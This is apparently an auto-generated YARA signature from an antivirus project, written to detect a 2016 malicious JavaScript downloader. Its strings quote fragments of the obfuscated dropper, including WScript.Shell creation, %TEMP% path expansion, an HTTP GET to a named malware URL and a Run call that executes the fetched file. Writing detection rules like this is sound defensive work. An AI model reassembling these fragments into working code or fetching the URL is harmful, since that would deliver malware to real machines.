rule sig_20160427_b212d7028d8ce1eaefe78be6147c2dd0 {
  meta:
    description = "datamaliciousorder - file 20160427_b212d7028d8ce1eaefe78be6147c2dd0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8c633c854cda8d5cdd1d9e382d184342d8e30ad76a6071449d84a10888f14cb7"

  strings:
    $s1  = "function RapfbQxmfr() {return JcsegTenup[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"GvVMHNY" ascii
    $s2  = "function RapfbQxmfr() {return JcsegTenup[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"GvVMHNY" ascii
    $s3  = "function QyfapXgjpd(ErdrnXibqv, RahdkFxgzu){RdhtsOyofl = RdhtsOyofl * 1; return ErdrnXibqv - RahdkFxgzu;};" fullword ascii
    $s4  = "var JcsegTenup = function RltkbUheam() {return FxadbFztpr[LhfzgGziho](\"WScript\"+\".Shell\");}(), PofsePzlmm = 11;" fullword ascii
    $s5  = "var FxadbFztpr = this[\"WScript\"];" fullword ascii
    $s6  = "if (XwzgiYnats[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "function CqzenAzszy(){return WvszwOaiol + \"\";};" fullword ascii
    $s8  = "function KvtfmSvtgf() {return ((UzmxtIvhgn == true) && (UzmxtIvhgn == UmtzuDzlfq)) ? 1 : RdhtsOyofl;};" fullword ascii
    $s9  = "XwzgiYnats[KwyuzOofmm](\"G\" + \"ET\", \"http://ca-cargo.sk/asl9ks\", false);" fullword ascii
    $s10 = "return QyfapXgjpd(AjiuxIfplt, UgjlgGdkxb);" fullword ascii
    $s11 = "var UzmxtIvhgn = false;" fullword ascii
    $s12 = "function MiidzWjmms()" fullword ascii
    $s13 = "var UmtzuDzlfq = false;" fullword ascii
    $s14 = "}while (VolygWheaq);" fullword ascii
    $s15 = "function OlwgsHgruv(){return LhfzgGziho;};" fullword ascii
    $s16 = "UzmxtIvhgn = true; " fullword ascii
    $s17 = "function WyjqrBgqam(RlqrtDonuw) {var ZnxytBxipp = (1, 2, 3, 4, 5, RlqrtDonuw); return ZnxytBxipp;};" fullword ascii
    $s18 = "UmtzuDzlfq = true; " fullword ascii
    $s19 = "function YcjyvItsqi(ZoazmGavfl){JcsegTenup[\"R\"+\"un\"](ZoazmGavfl, RdhtsOyofl, RdhtsOyofl);};" fullword ascii
    $s20 = "var JtrhiHxcqa = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}